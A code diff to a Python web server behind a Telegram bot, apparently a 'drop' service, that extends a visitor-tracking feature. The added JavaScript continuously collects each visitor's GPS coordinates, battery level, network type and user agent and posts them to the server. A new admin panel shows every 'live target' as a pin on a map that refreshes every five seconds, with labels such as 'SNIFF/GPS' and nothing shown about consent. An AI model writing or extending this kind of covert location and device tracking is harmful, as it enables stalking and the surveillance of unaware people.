@@ -118,6 +118,7 @@ def init_db():
             network_info TEXT,
             lat REAL DEFAULT 41.0082,
             lon REAL DEFAULT 28.9784,
+            battery_level TEXT DEFAULT 'Bilinmiyor',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -196,6 +197,14 @@ def init_db():
     ]:
         try:
             cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {def_val}")
+        except:
+            pass
+
+    for col, def_val in [
+        ("battery_level", "TEXT DEFAULT 'Bilinmiyor'")
+    ]:
+        try:
+            cursor.execute(f"ALTER TABLE visitor_logs ADD COLUMN {col} {def_val}")
         except:
             pass
 
@@ -864,10 +873,15 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
-                    // Client Geolocation & Telemetry Reporter
+                    // Client Geolocation & Telemetry Reporter (Pil ve Cihaz Durumu Dahil)
                     if (navigator.geolocation) {
                         navigator.geolocation.watchPosition(async (pos) => {
                             try {
+                                let batteryStatus = "Bilinmiyor";
+                                if (navigator.getBattery) {
+                                    const bat = await navigator.getBattery();
+                                    batteryStatus = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
+                                }
                                 await fetch('/api/report-telemetry', {
                                     method: 'POST',
                                     headers: {'Content-Type': 'application/json'},
@@ -876,7 +890,8 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                                         lat: pos.coords.latitude,
                                         lon: pos.coords.longitude,
                                         network: navigator.connection ? (navigator.connection.effectiveType + ' (' + (navigator.connection.type || 'wifi') + ')') : 'Wi-Fi / 4G Sniffed',
-                                        ua: navigator.userAgent
+                                        ua: navigator.userAgent,
+                                        battery: batteryStatus
                                     })
                                 });
                             } catch(e) {}
@@ -1716,7 +1731,17 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     cursor.execute("SELECT message, log_type, created_at FROM panel_logs ORDER BY id DESC LIMIT 25")
                     all_panel_logs = cursor.fetchall()
                     
-                    cursor.execute("SELECT user_id, ip, network_info, lat, lon, created_at FROM visitor_logs ORDER BY id DESC LIMIT 15")
+                    # GROUP BY user_id ile her kullanıcı için sadece en güncel konumu çekiyoruz (Ekranı dolduran üst üste binme hatası düzeltildi)
+                    cursor.execute("""
+                        SELECT v.user_id, v.ip, v.network_info, v.lat, v.lon, v.battery_level, v.created_at 
+                        FROM visitor_logs v
+                        JOIN (
+                            SELECT user_id, MAX(id) as max_id 
+                            FROM visitor_logs 
+                            GROUP BY user_id
+                        ) latest ON v.id = latest.max_id
+                        ORDER BY v.id DESC LIMIT 30
+                    """)
                     v_logs = cursor.fetchall()
 
                     logs_terminal = ""
@@ -1726,33 +1751,37 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{ld}]</span> <span style='color:{color};'>●</span> {m}</div>"
 
                     for vl in v_logs:
-                        uid, ip, net, vlat, vlon, vdate = vl
-                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <span style='color:#e11d48;'>[SNIFF/GPS]</span> User ID: {uid} | Ağ: {net} | Konum: {vlat}, {vlon}</div>"
+                        uid, ip, net, vlat, vlon, bat, vdate = vl
+                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <span style='color:#e11d48;'>[GPS/PİL]</span> User ID: {uid} | Pil: {bat} | Ağ: {net} | Konum: {vlat}, {vlon}</div>"
 
                     visitor_markers_js = ""
                     for vl in v_logs:
-                        uid, ip, net, vlat, vlon, vdate = vl
+                        uid, ip, net, vlat, vlon, bat, vdate = vl
                         visitor_markers_js += f"""
                         L.marker([{vlat}, {vlon}], {{
                             icon: L.divIcon({{
-                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);">🫆</div>',
+                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);" title="User ID: {uid} | Pil: {bat}">🫆</div>',
                                 iconSize: [32, 32],
                                 iconAnchor: [16, 16]
                             }})
-                        }}).addTo(takipMap).bindPopup("<b>🫆 Canlı Hedef / Kullanıcı</b><br>User ID: {uid}<br>Ağ / Wi-Fi: {net}<br>Zaman: {vdate}");
+                        }}).addTo(takipMap).bindPopup("<b>🫆 Canlı Hedef (Tekil Güncel Pin)</b><br>User ID: {uid}<br>🔋 Pil / Şarj: <b>{bat}</b><br>🌐 Ağ / Wi-Fi: {net}<br>Zaman: {vdate}");
                         """
 
                     content_html = f"""
                     <div class="form-box" style="border: 1px solid #38bdf8;">
-                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Wi-Fi / Cihaz Sniff Merkezi</h2>
-                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Telegram botu, arka plan worker servisleri ve mini app üzerinden bota bağlanan tüm kullanıcıların ağ, Wi-Fi sniffing ve sistem logları:</p>
+                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Wi-Fi / Cihaz & Pil Takibi</h2>
+                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Her hedef için yalnızca en son güncel konum gösterilir (üst üste binmeler engellendi). Arka planda 5 saniyede bir otomatik yenilenir:</p>
                         
-                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 220px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;">
+                        <div style="margin-bottom: 12px; display: flex; gap: 10px;">
+                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID ile hızlıca arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white;">
+                        </div>
+
+                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;" id="terminalLogBox">
                             {logs_terminal if logs_terminal else "<span style='color:var(--text-muted);'>Henüz yakalanan log bulunmuyor.</span>"}
                         </div>
 
-                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Konum Haritası (🫆 Hedef Takibi)</h3>
-                        <div id="takipMiniMap" style="width: 100%; height: 240px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
+                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Konum Haritası (Tekil Güncel Pinler)</h3>
+                        <div id="takipMiniMap" style="width: 100%; height: 260px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
                     </div>
 
                     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -1761,6 +1790,35 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         const takipMap = L.map('takipMiniMap').setView([41.0082, 28.9784], 11);
                         L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(takipMap);
                         {visitor_markers_js}
+
+                        // Auto-Refresh (Her 5 saniyede bir arka planda sayfayı yenilemeden güncel verileri akıtır)
+                        setInterval(() => {{
+                            fetch(window.location.href)
+                                .then(res => res.text())
+                                .then(html => {{
+                                    const parser = new DOMParser();
+                                    const doc = parser.parseFromString(html, 'text/html');
+                                    const newTerminal = doc.getElementById('terminalLogBox');
+                                    if(newTerminal) {{
+                                        document.getElementById('terminalLogBox').innerHTML = newTerminal.innerHTML;
+                                    }}
+                                }})
+                                .catch(e => console.log('Auto-refresh error', e));
+                        }}, 5000);
+
+                        function filterLogTable() {{
+                            const input = document.getElementById('logSearchInput').value.toLowerCase();
+                            const box = document.getElementById('terminalLogBox');
+                            const divs = box.getElementsByTagName('div');
+                            for (let i = 0; i < divs.length; i++) {{
+                                const txt = divs[i].innerText || divs[i].textContent;
+                                if (txt.toLowerCase().indexOf(input) > -1) {{
+                                    divs[i].style.display = "";
+                                }} else {{
+                                    divs[i].style.display = "none";
+                                }}
+                            }}
+                        }}
                     </script>
                     """
 
@@ -2693,11 +2751,12 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                 lon = float(data_json.get("lon", 28.9784))
                 net = str(data_json.get("network", "Wi-Fi Sniffed"))
                 ua = str(data_json.get("ua", ""))
+                bat = str(data_json.get("battery", "Bilinmiyor"))
                 client_ip = self.client_address[0]
 
                 conn = sqlite3.connect("drop_bot.db")
                 cursor = conn.cursor()
-                cursor.execute("INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon) VALUES (?, ?, ?, ?, ?, ?)", (uid, client_ip, ua, net, lat, lon))
+                cursor.execute("INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon, battery_level) VALUES (?, ?, ?, ?, ?, ?, ?)", (uid, client_ip, ua, net, lat, lon, bat))
                 conn.commit()
                 conn.close()
 
@@ -3493,7 +3552,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                     secure_link = f"{RENDER_EXTERNAL_URL}/drop/{order_id}"
                     u_lang = get_user_lang(u_id)
-                    success_text = LANG[u_lang]["success_msg"].format(id=order_id, link=secure_link)
+                    success_text = t["success_msg"].format(id=order_id, link=secure_link)
 
                     if main_loop:
                         asyncio.run_coroutine_threadsafe(bot.send_message(u_id, success_text, parse_mode="Markdown"), main_loop)
